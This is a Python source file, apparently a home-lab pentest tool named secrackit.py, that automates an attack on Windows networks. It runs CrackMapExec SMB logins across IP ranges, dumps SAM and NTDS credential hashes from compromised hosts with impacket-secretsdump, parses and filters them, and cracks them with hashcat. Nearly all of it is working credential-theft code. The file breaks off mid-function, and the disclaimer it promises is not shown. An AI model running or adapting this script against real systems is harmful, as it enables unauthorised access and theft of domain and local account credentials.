#!/bin/python3

# Updated on 2-15-23
## Added description #4.
###################### CREATED BY revsh3ll ########################
##################### PivotTheNet.github.io #######################
##################### github.com/PivotTheNet ######################
#          #        (#         #                                  #
#           #%#       %%#       ##(                               #
#             #&&%#    %%%#       %%%                             #
#    ,##/ *#%&&&&&&&&#  &&&&&.       &&%.                         #
#                 #&&&&&&&#%&&&&* #&   #&&&                       #
#       &&&&&&&&&&&&&&&&&&&&&&&&&&&&&  & #&&&. #  *               #
#     %            #&&&&&&&&&&&&&&&&&& &&/#&&&# &# ##             #
#         #&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%&%#&#            #
#      &&#     ,%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%&&&&&&            #
#          #&&&&&&&&&&&&&&&&&&&&( #&&&&&&&&&&&&&##%&&&            #
#       *&&#    &&&&&&&&&&&&&&    #&&&&&&&&&&&&&&&&#&#            #
#            &&%###&&&&&&&&&&/  #%         &&&&*#&&&&&( ,         #
#             #&&&&&&&&&&&&&&,           #&&&&&  #%&&&&# &        #
#            &&    #&&&&&&&&&#                #&&###&&&&&&        #
#           &     #&&&&&&&&&&&                  #&&&##&&&&        #
#                &&&&&&&&&&&&&&                  #&&&#&           #
#               %%.#%%&&&%&&&&&&#                 &&              #
#                  /%%%%%##%%%%%%%%%%#            #               #
#                   ## ###/ #### ####%%#                          #
#                     #   ##   ####  ######.                      #
##################### github.com/PivotTheNet ######################
##################### PivotTheNet.github.io #######################
###################### CREATED BY revsh3ll ########################

# secrackit.py

# What does secrackit.py do?
## secrackit.py automates the following into a single command:
## - Windows SMB auth checks (CrackMapExec)
## - Parses worthy NTLM hashes from secrets (Impacket-secretsdump)
## - Attempts to crack worthy NTLM hashes (Hashcat)
## - Exports both parsed and original command outputs to a directory.


# Story behind the script?
## After some AD labs online and at home, I found myself running these three scripts over and over. I also wanted to organize any dumped hashes by prepending IP, SAM or NTDS, etc to the NTLM hashes.

# Why so many comments? XD
## I'm learning python and it helps when I come back to it later. Maybe it'll help others too. :)


# How-To
## Run -h or read details at https://github.com/PivotTheNet/secrackit.py/tree/main#script-execution-explained


# Script prerequisites?
## - Packages crackmapexec, impacket-secretsdump, and hashcat must be installed and present in your $PATH.
## - If you aren't specifying a custom wordlist, via -wordlist, secrackit.py will default to rockyou.txt located at /usr/share/wordlists/rockyou.txt. 
## - If you're on Kali, simply do the following to install and prep the three required tools:
##		- sudo apt update && sudo apt install crackmapexec python3-impacket hashcat
##		- If you haven't ran these tools before, run each tool once before running secrackit.py. Some tools create databases, etc on their first run and this may cause issues for secrackit.py.(never tested)


# Shout-out to the makers of the tools "secrackit.py" simply automates:
## 1. CrackMapExec - https://github.com/byt3bl33d3r/CrackMapExec
## 2. Impacket-secretsdump - https://github.com/fortra/impacket
## 3. Hashcat - https://github.com/hashcat/hashcat

# DISCLAIMER at the end of code.




#######################
#### Imports below ####

from ast import Pass
from enum import Enum
import io
import subprocess
import ipaddress
import re
import sys
import os
import typing
import typer
from pathlib import Path
from datetime import datetime
from typing import Annotated, Optional

#### Imports above ####
#######################


#######################
#### Globals below ####
app = typer.Typer()

#### Globals above ####
#######################


#######################
### Types below #######
class PasswordOrHashChoice(str, Enum):
	password = "pw"
	ntlm = "ntlm"

PasswordSwitch = typing.Literal["-p", "-H"]

### Types above #######
#######################




######################
###Functions below ###

# Creates a folder, within the same directory as secrackit.py, with a naming scheme:
# "Month-Day-Year_Hour-Minute-Second"
def create_dir_for_dropping_that_output(user_input_dir_location: Path):

	# Check for current date and time and assign to "now" var.
	now = datetime.now()

	# Assign "currenttime" var to a specific date/time format as this will be in the folder's name. 
	currenttime = now.strftime('%m-%d-%y_%H-%M-%S_secrackit')

	# Try except statement to create or catch error.
	try:
		# Combine "currenttime" date/time var with "currentdir" var and create "createfolder" var, which will be the name of the folder created.
		createfolder = os.path.join(user_input_dir_location, currenttime)

		# Use os.mkdir method to create directory, where both tool and secrackit.py results will be saved.
		os.mkdir(createfolder)

		# Return full path of directory created, so we can place results into correct directory.
		return createfolder + "/"

	# Catch error when directory user provided doesn't actually exist. Yes, you can use os.mkdirs(), not the "s", BUT I don't want the script making accidental directories.
	except:
		sys.exit(
			"\n"
			"\n"
			"\n"
			f"Directory location: \"{user_input_dir_location}\" does not exist!\n"
			"Create the directory and retry.\n"
			"\n"
			"How the -out_dir flag works:\n"
			"A new (date/time) directory will be created within the directory specified by -out_dir flag.\n"
			"E.g. -out_dir ~/Desktop/attacks tells secrackit.py to make this (date/time) directory inside the \"attacks\" directory.\n"
			"This (date/time) directory will contain the output from any successful attacks.\n"
			"By default, secrackit.py creates this (date/time) directory within the same directory secrackit.py is launched from."
		)

# Validates if the provided IP or CIDR address, either entered at terminal or provided in a file, is/are correctly formatted.
# E.g., 192.168.1.1 or 10.10.10.0/24
# If a file containing IPs or CIDR formats was inputted, check IP or CIDR for typos and report error.
# Also make sure the file presented actually exists.
def validate_target_ips(user_input_target_ips: io.TextIOWrapper):
	# For each IP in "user_input_target_ips", loop...
	ips = user_input_target_ips.readlines()
	print(ips)
	for ip in ips:
		print(ip)
		# Strip each line and try...
		ip = ip.strip()
		try:
			# Check each line for a IP network aka 192.168.1.0/24 format.
			ipaddress.ip_network(ip)
		# If not an network ID, except, try...
		except:
			try:
				# Check each line for an IP address aka 192.168.1.1 format.			
				ipaddress.ip_address(ip)
			except:
				# If either network or address fail, sys.exit with message.
				sys.exit(
			  		f"Invalid IP format: {ip}\n"
					f"Found within file: {user_input_target_ips.name}\n"
					"\n"
					"Make sure each IP and/or CIDR are formatted line by line.\n"
					"\n"
					"Example:\n"
					"192.168.1.1\n"
					"192.168.1.10\n"
					"10.10.10.0/24\n"
				)

	return(user_input_target_ips)

# If "ntlm" argument inputted, verify if NTLM hash is indeed NLTM format.
# If "pw" inputted, verify if password is indeed a password and NOT a NTLM hash. 
def was_valid_hash_or_password_provided(user_input_password_or_ntlm_value: str, converted_pw_hash_flag: PasswordSwitch):
	
	# Define special characters that don't exist in NTLM hashes.
	special_chars = set("[@_!#$%^&*()<>?/\|}{~]")

	# Check if hash is either a password, incorrect format, or is indeed a NTLM hash format.
	if converted_pw_hash_flag == "-H":

		# If 65 in length, character position 32 is ':' and no special characters are found, confirmed NTLM hash. Return value.
		if len(user_input_password_or_ntlm_value) == 65 and user_input_password_or_ntlm_value.index(":") == 32 and not special_chars.intersection(user_input_password_or_ntlm_value) == None:
			confirmed_ntlm_hash_format = user_input_password_or_ntlm_value
			return (confirmed_ntlm_hash_format) 

		# If 32 in length and no special characters are found, either a LM or NT hash found. Chances of this being a password are slim. Throw error with message.
		elif len(user_input_password_or_ntlm_value) == 32 and not special_chars.intersection(user_input_password_or_ntlm_value) == None:
			sys.exit(
				"\n"
				"Wrong hash format!\n"
				"If flag was meant for 'ntlm', please enter NTLM hash in the following LM:NT format:\n"
				"'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'\n"
				"\n"
				"No network tools ran!\n"
				"If this was indeed a 32 character password with no special characters, let me know. I'll work on a fix!\n"
			"")

		else:

			# Was a password entered when the 'ntlm' flag was set? Prompt user with direction.
			sys.exit(
				"\n"
				"Did you mean to enter a password or NTLM hash? \n"
				"Check password/NTLM value entered AND if 'ntlm' flag was meant for 'pw'!\n"
				"\n"
				"Remember to enter NTLM hash in the following LM:NT format:\n"
				"'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'\n"
				"\n"
				"No network tools ran!"
			)

	# Verify if password is actually a hash and prompt user as needed.
	elif converted_pw_hash_flag == "-p":

		# If NTLM hash, prompt user to check 'pw' flag and review. Wrong flag set?
		if len(user_input_password_or_ntlm_value) == 65 and user_input_password_or_ntlm_value.index(":") == 32 and not special_chars.intersection(user_input_password_or_ntlm_value) == None:
			sys.exit(
				"\n"
				"Possible NTLM hash entered with \"pw\" flag set.\n"
				"Check password/NTLM hash value entered OR if the \"pw\" flag was meant for \"ntlm\"!\n"
				"\n"
				"No network tools ran!"
			)
		

		elif len(user_input_password_or_ntlm_value) == 32 and not set(":").intersection(user_input_password_or_ntlm_value) == ":":
			sys.exit(
				"\n"
				"Flag 'pw' is set for password and password/hash value is 32 characters in length with no special characters?\n"
				"Check password/hash value entered OR if the 'pw' flag was meant for 'ntlm'!\n"
				"\n"
				"No network tools ran!"
			)

		else:

			# If not looking like a hash and flag pw was set, return value and continue script.
			confirmed_password_format = user_input_password_or_ntlm_value
			return(confirmed_password_format)

	else:

		# This error shouldn't happen as argparse should catch no value when the "Pass_or_NTLM_val" is required input.
		len(user_input_password_or_ntlm_value) == 0
		sys.exit(
			"\n"
			"No value was entered into the password/hash field.. How did you end up here?\n"
			"\n"
			"No network tools ran!"
		)




# Run CME against LOCAL AUTH only. Domain auth found in it's own function below this one!
# Returns string as raw, ANSI riddled output.

# CME takes in target(s) IP/CIDR, converted pw-ntlm flag, Pass_or_NTLM_val, along with the username and -localauth flag.
def run_crackmapexec_against_local(user_input_target_ips: io.TextIOWrapper, user_input_username: str, converted_pw_hash_flag: PasswordSwitch, validated_NTLM_hash_or_password: str, user_input_local_flag: bool):

	# If argparse "user_input_local_flag" value equal to True...
	if user_input_local_flag == True:

		# Create var "local_flag", which will be inputted into CME to run LOCAL auth.
		local_flag = "--local-auth"

		# Create var "local" to insert into the user terminal feedback.
		local = "Local"

		# Terminal feed showing the overall options being ran.
		# If IP argument is a file, only the file name is presented.
		print(
			"\n"
			"Running CrackMapExec with the following options:\n"
			f"  Local or Domain Auth? = {local}\n"
			f"  Target IP, CIDR, or File = {user_input_target_ips}\n"
			f"  Username = {user_input_username}\n"
			f"  NTLM or Password = {validated_NTLM_hash_or_password}\n"
		)
	else:
		# This error shouldn't happen in normal OP.
		sys.exit("--local-auth not set but running under local authentication?")

	# Var "crackmapexec_cmd" which holds the subprocess.run function output.
	# Passing the needed arguments into CME. Specifying "local_flag" for local auth only.
	crackmapexec_cmd = subprocess.run(["crackmapexec", "smb", user_input_target_ips.name, "-u", user_input_username, converted_pw_hash_flag, validated_NTLM_hash_or_password, local_flag], capture_output=True)

	# To convert the byte output to string.
	crackmapexec_cmd_to_str = crackmapexec_cmd.stdout.decode()

	# Providing further feedback to user, updating on what possibly auth there was.
	# Looks for "[+]" and "Pwn3d" in output.
	# [+] represents successful authentication but not necessarily administrative access.

	# "Pwn3d" means both successful authentication and administrative access.
	if (("[+]" in crackmapexec_cmd_to_str and "Pwn3d" in crackmapexec_cmd_to_str)):
		print(
			"\n"
			"LOCAL authentication and administrative access found!\n"
		)

		return(crackmapexec_cmd_to_str)

	# If account authenticates but doesn't have administrative rights...
	# Always worth running either way... may be bad CME feedback. I've heard it's happened from others.
	elif ("[+]" in crackmapexec_cmd_to_str):
		print(
			"\n"
			"LOCAL authentication found. Administrative access unknown!\n"
			"Successful secretsdump NOT GUARANTEED but worth checking... attempting secretsdump!\n"
		)

		return(crackmapexec_cmd_to_str)

	# Unsure this situation can happen but why not define it...
	elif ("Pwn3d" in crackmapexec_cmd_to_str):
		print(
			"\n"
			"Confirmed LOCAL administrative access but LOCAL authentication unconfirmed!\n"
		)

		return(crackmapexec_cmd_to_str)

	else:
		# If authentication failed all together, this message is thrown.
		sys.exit(
			"\n"
			"LOCAL authentication failed against ALL targets...\n"
			"Please try again with new credentials, targets, and/or DOMAIN level authentication(remove -localauth flag)."
		)	




# Function to run CME against DOMAIN AUTHENTICATION only. Local auth found in it's own function above!
# Returns string of raw, ANSI riddled output.

# CME takes in validated Target IPs, converted pw-ntlm flag, NTLM or Password, along with user input domain. Local flag passed for debugging.
def run_crackmapexec_against_domain(user_input_target_ips: io.TextIOWrapper, user_input_domain: str, user_input_username: str, converted_pw_hash_flag: PasswordSwitch, validated_NTLM_hash_or_password: str, user_input_local_flag: bool):

	# Terminal feed showing the overall options being ran.
	# If IP argument is a file, only the file name is presented.
	if user_input_local_flag == False:
		domain = "Domain"
		print(
			"\n"
			"Running CrackMapExec with the following options:\n"
			f"  Local or Domain Auth? = {domain}\n"
			f"  Target IP, CIDR, or File = {user_input_target_ips.name}\n"
			f"  Username = {user_input_username}\n"
			f"  NTLM or Password = {validated_NTLM_hash_or_password}\n"
		)
	else:
		# Error for debugging purposes. Shouldn't flag during normal OP.
		sys.exit("--local-auth set but running under domain authentication?")

	# Var "crackmapexec_cmd" which holds the subprocess.run function output.
	# Passing the needed arguments into CME. Specifying "-d" for domain auth.
	crackmapexec_cmd = subprocess.run(["crackmapexec", "smb", user_input_target_ips.name, "-d", user_input_domain,"-u", user_input_username, converted_pw_hash_flag, validated_NTLM_hash_or_password], capture_output=True)

	# To convert the byte output to string.
	crackmapexec_cmd_to_str = crackmapexec_cmd.stdout.decode()


	# Providing further feedback to user, updating on what possibly authentications there were.
	# Providing further feedback to user, updating on what possibly auth there was.
	# Looks for "[+]" and "Pwn3d" in output.
	# "Pwn3d" mean both successful authentication and administrative privs.
	if (("[+]" in crackmapexec_cmd_to_str and "Pwn3d" in crackmapexec_cmd_to_str)):
		print("\nDOMAIN authentication and administrative access found!\n")

		return(crackmapexec_cmd_to_str)

	# If account authenticates but doesn't have administrative rights...
	# Always worth running either way... may be bad CME feedback. I've heard it's happened from others.
	elif ("[+]" in crackmapexec_cmd_to_str):
		print(
			"\n"
			"DOMAIN authentication found. Administrative access unknown!\n"
			"Successful secretsdump NOT GUARANTEED but worth checking... attempting secretsdump!\n"
		)

		return(crackmapexec_cmd_to_str)

	# Unsure this situation can happen but why not define it...
	elif ("Pwn3d" in crackmapexec_cmd_to_str):
		print("Confirmed DOMAIN administrative access but LOCAL authentication unconfirmed!\n")

		return(crackmapexec_cmd_to_str)

	else:
		# If authentication failed all together, this message is thrown.
		sys.exit(
			"\n"
			"DOMAIN authentication failed against ALL targets...\n"
			"Please try again with new credentials, targets, and/or LOCAL level authentication(add -localauth flag)."
		)



# Remove ANSI escape from the CME output...
def remove_ansi_escape(run_crackmapexec_function_output: str):

	# Var "ansi_escape_chars" is regex compile of all ANSI characters to remove.
	ansi_escape_chars = re.compile(r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]')

	# "no_ansi_cme" var stores output. re.sub is ran on "run_crackmapexec_function_output".
	no_ansi_cme = ansi_escape_chars.sub('', run_crackmapexec_function_output)

	# Return clean "no_ansi_cme".
	return(no_ansi_cme)



# Create CME data file where CME raw output will be exported to.
def cme_data_file(directory_location: str, NetworkID_for_files: str):
	return f'{directory_location}cme_data_{NetworkID_for_files}.txt'


# Exports ANSI free CME output to a file.
# File located where user specified or in default location(aka where secrackit.py ran from). 
def export_CME_to_file(removed_ansi_CME_output: str, cmd_data_file_location: str):
	# Open new file with append permission.
	with open(cmd_data_file_location, "a") as export_CME_data:
		# Write "removed_ansi_CME_output" to opened file.
		export_CME_data.write(removed_ansi_CME_output)


# Take in CME string output and remove unwanted characters from string.
# Providing a simple string to parse into a list later. 
def parse_crackmapexec_results_string(removed_ansi_CME_output):

	# Removed whitespace from the string, so it's easier to parse!
	removed_whitespace = str.lstrip(str.rstrip(re.sub(' +',' ',removed_ansi_CME_output)))

	# Remove port 445
	port_removed = re.sub('445 ', '', removed_whitespace)

	# Remove SMB protocol
	smb_removed = re.sub('SMB ', '', port_removed)

	# Removed [+] from string
	plus_sign_removed = re.sub(' \[\+\]', '', smb_removed)

	# Return results.
	parsed_string_to_return = plus_sign_removed
	return(parsed_string_to_return)



# Move parsed CME results over to a list, sort it, so we can organize results per target.
def convert_parsed_CME_to_list(parsed_CME_string):

	# Split the terminal string output into a new list at the \n regex.
	new_lines_parsed = parsed_CME_string.split('\n')

	# Remove empty(if any) elements from list.
	removed_empty_elements = [i for i in new_lines_parsed if i]

	# Remove the initial lines from the list containing the "[*]" characters.
	# These are informational and aren't needed for our script.
	removed_unwanted_elements = [x for x in removed_empty_elements if "[*]" not in x]

	# Remove failed authentication attempts by removing items containing "[-]" characters.
	removed_failed_auth = [x for x in removed_unwanted_elements if "[-]" not in x]

	# Sort results in some sequential order...
	removed_failed_auth.sort()

	# Provide user terminal feedback of how many targets will be attacked with secretsdump.
	# This includes BOTH confirmed admin access and anything that authenticates.
	# Reason to include non-admin authenticated is that I've heard others have successful secretsdump even when CME doesn't show the access as "Pwn3d"... So I'm playing it safe...
	number_of_admin_auth = sum('Pwn3d' in s for s in removed_failed_auth)
	number_of_targets = str(len(removed_failed_auth))
	print(f"{number_of_admin_auth} of {number_of_targets} targets provide administrative access!\n")

	# This prints the cleaned, simply CME results on terminal for user.
	print("CME Results:")
	for failed_auth in removed_failed_auth:
		print(failed_auth)

	# Return simple, cleaned CME results.
	clean_CME_results = removed_failed_auth
	return(clean_CME_results)



# Create and return list of IPs, from CME results.
# This list will feed into a secretsdump's loop.
def create_IP_list(CME_string_to_list):

	# Create regex pattern for pulling out 
	IP_pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')

	# Create empty list to feed found IPs into.
	IP_list = []

	# For each in list, append to IP_list.
	for asset in CME_string_to_list:
		result = IP_pattern.search(asset)
		if not result:
			continue
		IP_list.append(result[0])

	# Return new IP_list.
	return(IP_list)



def make_networkID(IP_list_for_secretsdump):

	# Assign first IP in "IP_list_for_secretsdump" list to var "IP_address".
	IP_address = IP_list_for_secretsdump[0]

	# "IP_pattern" represents the NetworkID of (possibly) common IP addresses attacked.
	IP_pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3})')

	# "NetworkID" holds the output of re.search, which looks for pattern against index[0].
	network_ID = re.search(IP_pattern, IP_address)

	if not network_ID:
		sys.exit("No NetworkID found... Exiting...")

	# "IP_to_file" holds NetworkID pulled from group(0) of re.search outcome.
	IP_to_file = (network_ID.group(0))

	# Return results
	return(IP_to_file)


# Runs impacket_secretsdump against specified "target_ip" called upon.
# Returned results are combined with extra strings, to help separate results per IP.
def run_impacket_secretsdump(user_input_domain, user_input_username,validated_NTLM_hash_or_password, IP_list_for_secretsdump):

	# "secretsdump_subprocess" var holds secretsdump results.
	secretsdump_subprocess = subprocess.run(["impacket-secretsdump", f"{user_input_domain}/{user_input_username}:{validated_NTLM_hash_or_password}@{IP_list_for_secretsdump}"], capture_output=True)

	# Convert byte code to string.
	secretsdump_output_to_str = secretsdump_subprocess.stdout.decode()

	# Prepend and append some designations to result, so parsing/browsing is easier.
	prepend_IP_to_results = f"=== Beginning of results for {IP_list_for_secretsdump} ===\n{secretsdump_output_to_str}=== Ending of results for {IP_list_for_secretsdump} ===\n"

	# Return results.
	return(prepend_IP_to_results)


# Export raw var "secretsdump_raw_list" to new file in created folder.
def export_secretsdump_raw_list(secretsdump_raw_list: list[str], secretsdump_raw_file_location: str):

	with open(secretsdump_raw_file_location, "a") as export_secretsdump_data:
		# For each dump write to file with separating "#" symbols.
		for dump in secretsdump_raw_list:
		
			# Write "secretsdump_raw_list" to opened file.
			export_secretsdump_data.write(dump + "\n\n" + "#######################################################\n\n\n")


# Parse SAM section from secretsdump results and prepend "SAM-" before each.
def remove_SAM_section(secretsdump_raw_list):

	# For each string, check if it contains the variable's string.
	SAM_string_check = "Dumping local SAM hashes"

	# If the string is found in "secretsdump_raw_list", extract and assign to list then append SAM- to each item.
	if SAM_string_check in secretsdump_raw_list:

		# Create empty list called results.
		results = ""

		# Strings used with index to find characters found between each.
		string1 = "\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)"
		string2 = "\n[*] Dumping cached domain"

		# Create two variables storing the index location of each found string.
		index1 = secretsdump_raw_list.index(string1)
		index2 = secretsdump_raw_list.index(string2)

		# For each item in list...
		# Add string chars between index1 plus the length of index to index 2.
		for index in range(index1 + len(string2) + 1, index2):
			results = results + secretsdump_raw_list[index]

		# Remove any "\n" with "\nSAM-", to designate where indexed from.
		added_SAM = results.replace("\n", "\nSAM-")

		# Return result, which will then be added to SAM only list of lists.
		return(added_SAM)

		# Else if nothing is found...
	else:

		# Pass and move onto next item in list. If no pass, it'll error.
		pass


# Parse NTDS section from secretsdump results and prepend "NTDS-" before each.
def remove_NTDS_section(secretsdump_raw_list):

	NTDS_string_check = "NTDS.DIT secrets"
	
	# If string is found in "secretsdump_raw_list", extract and assign to list then append NTDS- to each item.
	if NTDS_string_check in secretsdump_raw_list:

		# Create empty list called results.
		results = ""

		# Strings used with index to find characters found between each.
		string1 = "Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n"
		string2 = "\n[*] Kerberos"

		# Create two variables storing the index location of each found string.
		index1 = secretsdump_raw_list.index(string1)
		index2 = secretsdump_raw_list.index(string2)

		# For each item in list...
		# Add string chars between index1 plus the length of index to index 2.
		for index in range(index1 + len(string2) + 1, index2):
				results = results + secretsdump_raw_list[index]

		# Remove any "\n" with "\nNTDS-", to designate where indexed from.
		added_NTDS = results.replace("\n", "\nNTDS-")

		# Return result, which will then be added to NTDS only list of lists.
		return(added_NTDS)

		# Else if nothing is found...
	else:

		# Pass and move onto next item in list.
		pass



# Zip both SAM and NTDS list of lists via row-wise.
def combine_convert_SAM_and_NTDS_results(
		SAM_section_parsed: list[str | None], 
		NTDS_section_parsed: list[str | None]
	):
	
	# variable holding list of zipped list of lists, creating a list of tuples.
	combined_SAM_NTDS_tuple = list(zip(SAM_section_parsed, NTDS_section_parsed))

	# As I want to change these lists still, I convert to list of strings.
	SAM_NTDS_list_of_strings = [str(element) for element in combined_SAM_NTDS_tuple]

	# Return list of strings.
	return(SAM_NTDS_list_of_strings)



# Parses "secretsdump_raw_list" for IPs, so returned value reflects order of results.
# May be unnecessary but doing this step anyways.
def parse_IP_from_secrets(secretsdump_raw_list):

	# regex which matches IP addresses
	IP_pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')

	# var "search_IP" holds results of of re.search
	search_IP = re.search(IP_pattern, secretsdump_raw_list)

	if not search_IP:
		sys.exit("No IP found... Exiting...")

	# extract group 0 which contains the IP from search
	current_IP = (search_IP.group(0))

	# return value
	return(current_IP)	



# Extracts NTLM hashes and formats them to be hashcat friendly.
# From my testing, hashcat only likes one semi-colon in a hash input.
# So I replace the first two occurrences of ":"(semicolon) with a "-"(dash).
# Goal is... Hashcat will ingest IP-{SAM, NTDS}-{domain.name}\\username-RID:LThash:NThash with module 1000(-m 1000).
def parsed_secretsdump_list(combined_SAM_NTDS_results: str):

	# regex pattern re compiles - {SAM NTDS}-{domain.name\\}ACCOUNT-RID-LT:NT
	NTLM_pattern = re.compile(r'([A-Z]*[-][A-Za-z0-9\\\^\$\.\|\?\*\+\(\)\{\}]*[A-Za-z0-9\$\-]*[:][0-9]*[:][a-z0-9A-Z]{32}[:][a-zA-Z0-9]{32})')

	# re.findall is used to find all instances of a NTLM pattern in the output.
	parsed_hashes = re.findall(NTLM_pattern, combined_SAM_NTDS_results)

	# Found NTLM hashes moved into a list then map is ran in each item to replace the first two semi-colons (":") with a hyphen ("-").
	parsed_hashes: list[str] = list(map(lambda s: s.replace(":", "-", 2), parsed_hashes))

	# Return results.
	return(parsed_hashes)



# Removes WDAG and disabled accounts from parsed dumps.
def remove_default_hashes(ordered_per_IP_hash_list: list[list[str]]):

	# NTLM hash representing disabled account on a Windows host.
	disabled_account_hash = "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"

	# List comprehension with nested comprehension as the items we're accessing are in a list of a list.
	# Substring expression simply does a copy with a for loop if NTLM doesn't equal "disabled_account_hash".
	clean_results_of_dead_hashes = [[substring for substring in sublist if disabled_account_hash not in substring] for sublist in ordered_per_IP_hash_list]

	# Same as before but with the removal of WDAG account.(Defender account for edge isolation.)
	WGAGUtility = "WDAGUtilityAccount"

	# Copy all BUT WDAG accounts over into new list of list.
	clean_results_of_WDAG_hash = [[substring for substring in sublist if WGAGUtility not in substring] for sublist in clean_results_of_dead_hashes]

	# Return WDAG & disabled hashes in list of list.
	return(clean_results_of_WDAG_hash)



# Remove computer accounts from SAM dumps.
def remove_computer_hashes(removed_default_hashes: list[list[str]]):
	
	# string to search for.
	computer_hashes = "$-"

	# for each item in list of list, create new list of list which includes all BUT computer accounts.
	clean_results_of_computer_hashes = [[substring for substring in sublist if computer_hashes not in substring] for sublist in removed_default_hashes]

	# Return results
	return(clean_results_of_computer_hashes)



# Removes duplicate accounts in SAM results
def remove_duplicate_hashes(removed_computer_hashes: list[list[str]]):

	# Create new list which doesn't include duplicate hashes through comprehension.
	remove_duplicate_hashes = [[i for n, i in enumerate(sublist) if i not in sublist[:n]] for sublist in removed_computer_hashes]

	# Return new list.
	return(remove_duplicate_hashes)



# Extract dictionary key values(a list), and saves output to combined list.
def dict_key_value_to_IP_HASH(final_IP_to_hash: dict[str, list[str]]):

	# Create empty list
	dict_to_single_list: list[tuple[str, str]] = []

	# For each key in dictionary...
	for key in final_IP_to_hash:

		# For each list in key...
		for lists in final_IP_to_hash[key]:

			# var "combined" contains key, lists order
			combined = (key, lists)

			# Append new list of KEY:VALUE
			dict_to_single_list.append(combined)

	# Return list 
	return(dict_to_single_list)



# Convert list of tuples to list of strings, adding hyphen to divide IP from account.
def tuples_to_list(dictionary_of_lists_to_list_of_tuples):

	# "result" var holds new list, which converted from tuple to strings and joined with hyphen.
	result = ['-'.join (i) for i in dictionary_of_lists_to_list_of_tuples]

	# Return list of strings
	return(result)


# Create file and append IP-{SAM, NTDS}-{domain.name\\}-ACCOUNT-RID-NTLM hashes to file.
def list_of_hashes_to_file(list_of_hashes_as_strings, export_hashes_location):
	
	# Check if "list_of_hashes_as_strings" is empty...
	# "list_of_hashes_as_strings" is the parsed secretsdump list of strings.
	is_list_completely_empty = all(item is None for item in list_of_hashes_as_strings)

	# if the "list_of_hashes_as_strings" is NOT
	if is_list_completely_empty != True:

		# Open new file with write permission with naming convention.
		with open(export_hashes_location, "a") as file:

			# var for appending each via .join and a new line each
			hashes_to_write = "\n".join(list_of_hashes_as_strings)

			# Write var "hashes_to_write" to file until done then close file
			file.write(hashes_to_write)

		# Return terminal feedback of progress...
		print("Secretsdump successfully dumped some hashes!")

		return(export_hashes_location)

	else:
		# If account used doesn't have admin access, it will likely fail but worth trying...
		sys.exit(
			"\n"
			"Secretsdump has failed administrative access to the target(s) above!\n"
			"NO NTLM hashes were dumped and no additional files were created!\n"
			"Hashcat will not run!"
		)



# Hashcat potfile location, which is used to keep results separate between runs.
def hashcat_potfile_location(NetworkID_for_files, directory_location):

	# File location for potfile, used for each run.
	hashcat_potfile_location_is = f"{directory_location}hashcat.potfile_{NetworkID_for_files}"

	# Return location value
	return(hashcat_potfile_location_is)



# Run hashcat against exported hashes
def run_hashcat(potfile_location, file_for_hashcat_location, wordlist_location: Path, rule_location):

	# Terminal feedback for which wordlist and/or rule hashcat is using...
	print(
		"\n"
		"\n"
		"\n"
		"Attempting to crack NTLM hashes!\n"
		"\n"
		"Hashcat settings:\n"
		"  Wordlist: " + wordlist_location.name + "\n"
		"  Rule: No rule"
	)

	# Code for taking in ntlm_hashes_file and outputting hashcat results
	hashcat_cmd = subprocess.run(["hashcat", "-m", "1000", "--username", file_for_hashcat_location, wordlist_location, "--potfile-path", potfile_location], capture_output=True)

	# To convert the byte output to string.
	hashcat_cmd_to_str = hashcat_cmd.stdout.decode()

	# Return string of hashcat results for exporting
	return(hashcat_cmd_to_str)



# Run hashcat against exported hashes WITH custom rule
def run_hashcat_rule(
		potfile_location: str, 
		file_for_hashcat_location: str, 
		wordlist_location: Path, 
		rule_location: io.TextIOWrapper
	):

	# Terminal feedback for which wordlist and/or rule hashcat is using...
	print(
		"\n"
		"\n"
		"\n"
		"Attempting to crack NTLM hashes!\n"
		"\n"
		"Hashcat settings:\n"
		f"  Wordlist: {wordlist_location}\n"
		f"  Rule: {rule_location}\n"
	)

	# Code for taking in ntlm_hashes_file and outputting hashcat results
	hashcat_cmd = subprocess.run(["hashcat", "-m", "1000", "--username", file_for_hashcat_location, str(wordlist_location), "--potfile-path", potfile_location, "--rules-file", str(rule_location)], capture_output=True)

	# To convert the byte output to string.
	hashcat_cmd_to_str = hashcat_cmd.stdout.decode()

	# Return string of hashcat results for exporting
	return(hashcat_cmd_to_str)


# export raw hashcat output to file
def print_hashcat_raw(hashcat_results: str, hashcat_raw_file_location: str):

	# Export to file the raw hashcat results
	# Create file variable where data is written.
	hashcat_results_output_file = hashcat_raw_file_location

	# Open new file with write permission with naming convention.
	with open(hashcat_results_output_file, "a") as file:

		# Since hashcat is ran once together, no need to separate each string.
		hashcat_output_to_write = "".join(hashcat_results)

		# Write data to file
		file.write(hashcat_output_to_write)

	# Return hashcat raw hashcat output, if needed.
	return(hashcat_results_output_file)



# Display cracked hash results, which hashcat presents in output.
def check_crack_percentage(hashcat_results: str):

	# Var holding string
	NTDS_string_check = "Session..........: hashcat"
	
	# If string is found in "hashcat_results"...
	if NTDS_string_check in hashcat_results:

		# Create empty list called results.
		results = ""

		# Create strings we'll index for to find there locations, which we'll use for parsing.
		string1 = "Vec:"
		string2 = "\nProgress.........: "

		# Variables that find and store the location of each index found.
		index1 = hashcat_results.index(string1)
		index2 = hashcat_results.index(string2)

		# Add string chars between index1 plus the length of index to index 2.
		for index in range(index1 + len(string2) + 1, index2):
				results = results + hashcat_results[index]

		# Else if nothing is found...

	else:

		# Pass and move onto next item in list.
		pass
	
	# Can't get the "..." with above, so doing a re.sub to remove it.
	clean_hashcat_percentage = re.sub("...: ", "", results)

	# Print to screen the percentage of successful cracked NTLM hashes.
	print(
		'\n'
		f"Hashcat success rate: {clean_hashcat_percentage}\n"
	)



# Run hashcat again but with --show. This will result in our formatted output and creds appended!
def final_cracked_list(potfile_location: str, file_for_hashcat_location: str):

	# Code for taking in ntlm_hashes_file and outputting hashcat results
